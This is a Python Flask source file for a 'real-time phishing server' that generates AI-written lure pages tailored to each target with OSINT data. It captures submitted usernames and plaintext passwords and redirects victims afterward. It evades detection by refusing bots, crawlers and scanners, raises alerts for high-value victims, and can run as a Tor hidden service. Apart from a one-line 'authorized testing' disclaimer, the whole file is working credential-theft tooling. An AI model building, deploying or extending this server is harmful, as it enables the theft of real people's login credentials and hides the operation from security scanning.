#!/usr/bin/env python3
# Real-time Phishing Server with AI Capabilities
# ONLY FOR AUTHORIZED SECURITY TESTING

from flask import Flask, render_template, request, jsonify, redirect
from modules.analytics import log_event, generate_realtime_dashboard
from modules.osint import enrich_target
from modules.ai_content import generate_phishing_content
from utils.sanitize import ai_detect_injection, clean_input
from utils.tor import get_onion_address
import yaml
import os
import datetime
import threading

app = Flask(__name__)

# Load configuration
with open('config/settings.yaml', 'r') as f:
    config = yaml.safe_load(f)

# AI phishing content cache
content_cache = {}
cache_lock = threading.Lock()

@app.before_request
def security_checks():
    """Pre-request security validations"""
    # Block suspicious user agents
    user_agent = request.headers.get('User-Agent', '').lower()
    if any(bot in user_agent for bot in ['bot', 'spider', 'crawler', 'scan']):
        return "Access denied", 403
    
    # Check for prompt injection attempts
    if any(ai_detect_injection(param) for param in request.values.values()):
        log_event({
            'timestamp': datetime.datetime.utcnow().isoformat(),
            'event_type': 'security_alert',
            'ip': request.remote_addr,
            'details': 'Potential prompt injection detected',
            'severity': 'high'
        })
        return "Invalid request", 400

@app.route('/')
def index():
    """Serve AI-enhanced phishing page"""
    target = clean_input(request.args.get('target', ''))
    context = request.args.get('context', 'security_update')
    
    # Get or generate phishing content
    cache_key = f"{target}_{context}"
    if cache_key not in content_cache:
        target_data = enrich_target(target)
        with cache_lock:
            content_cache[cache_key] = generate_phishing_content(target_data, "email")
    
    return render_template('login.html', 
                           target=target,
                           context=context,
                           content=content_cache[cache_key],
                           company=config['phishing']['company_name'])

@app.route('/login', methods=['POST'])
def login():
    """Capture and process credentials in real-time"""
    try:
        # Sanitize and validate input
        username = clean_input(request.form.get('username'))
        password = clean_input(request.form.get('password'))
        context = clean_input(request.form.get('context', ''))
        
        # Blockchain authentication for sensitive operations
        if config['blockchain'].get('enabled', False):
            from modules.blockchain_auth import verify_command
            command = f"CAPTURE:{username}:{context}"
            if not verify_command(command, 
                                 request.form.get('signature', ''),
                                 request.form.get('executor', '')):
                log_event({
                    'timestamp': datetime.datetime.utcnow().isoformat(),
                    'event_type': 'blockchain_auth_fail',
                    'username': username,
                    'ip': request.remote_addr
                })
                return "Authorization failed", 403
        
        # Enrich with OSINT
        target_data = enrich_target(username)
        
        # Create log entry
        log_entry = {
            'timestamp': datetime.datetime.utcnow().isoformat(),
            'username': username,
            'password': password,
            'ip': request.remote_addr,
            'user_agent': request.headers.get('User-Agent', ''),
            'context': context,
            'osint': target_data,
            'type': 'credential'
        }
        
        # Secure logging
        log_event(log_entry)
        
        # Voice alert for high-value targets
        if target_data.get('importance', 0) > 8:
            from modules.voice_synthesis import clone_voice
            message = f"Alert: Credentials captured for {username} in {context} campaign"
            clone_voice(message, "alert_voice")
        
        # Redirect target
        return redirect(config['phishing']['redirect_url'], code=302)
    
    except Exception as e:
        log_event({
            'timestamp': datetime.datetime.utcnow().isoformat(),
            'event_type': 'server_error',
            'error': str(e),
            'ip': request.remote_addr
        })
        return jsonify({'error': 'Internal server error'}), 500

@app.route('/dashboard')
def dashboard():
    """Realtime analytics dashboard"""
    if not config.get('dashboard_enabled', True):
        return "Access denied", 403
        
    # Blockchain authentication
    if config['blockchain'].get('dashboard_auth', False):
        from modules.blockchain_auth import verify_command
        if not verify_command("DASHBOARD_ACCESS", 
                             request.args.get('signature', ''),
                             request.args.get('address', '')):
            return "Authorization failed", 403
    
    return generate_realtime_dashboard()

@app.route('/tor-address')
def tor_address():
    """Get Tor hidden service address"""
    if config['tor'].get('enabled', False):
        return jsonify({'onion_address': get_onion_address()})
    return "Tor not enabled", 404

if __name__ == '__main__':
    # Start Tor thread if enabled
    if config['tor'].get('enabled', False):
        from utils.tor import start_tor_proxy
        tor_thread = threading.Thread(target=start_tor_proxy)
        tor_thread.daemon = True
        tor_thread.start()
    
    # Start main application
    ssl_context = ('cert.pem', 'key.pem') if config['server']['use_ssl'] else None
    app.run(
        host=config['server']['host'],
        port=config['server']['port'],
        ssl_context=ssl_context,
        threaded=True
    )